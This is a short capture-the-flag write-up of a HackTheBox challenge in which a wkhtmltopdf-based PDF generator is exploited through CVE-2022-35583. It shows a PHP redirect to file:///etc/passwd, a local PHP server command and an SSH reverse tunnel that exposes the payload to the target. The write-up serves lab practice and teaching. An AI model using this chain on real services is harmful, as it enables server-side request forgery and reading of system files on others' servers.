In this HackTheBox challenge, We have a website used to dump a PDF based on an existing website:

![Untitled](Untitled.png)

We know that the flag is in the `/etc/passwd` file and when trying to generate a PDF for Google it works correctly.

Let’s see how the PDF request works:

![Untitled](Untitled%201.png)

The request gets a JSON with `url` as a single field and, if the conversion goes as expected a PDF name is returned. Then the PDF is stored in `/static/pdfs/[file name].pdf`.

After some tests, and get some errors as the following one:

![Untitled](Untitled%202.png)

I was sure about one thing: the PDF is made up using the wkhtmltopdf library.

Searching on Google I noticed that there is a CVE over this library: **[CVE-2022-35583](https://github.com/wkhtmltopdf/wkhtmltopdf/issues/5249)**

Then, looking for a PoC I found this useful guide: **[wkhtmltopdf SSRF](https://exploit-notes.hdks.org/exploit/web/security-risk/wkhtmltopdf-ssrf/).**

```php
<?php
  header("Location: file:///etc/passwd");
?>
```

```php
php -S 0.0.0.0:8081
```

```php
ssh -R 80:localhost:8081 nokey@localhost.run
```
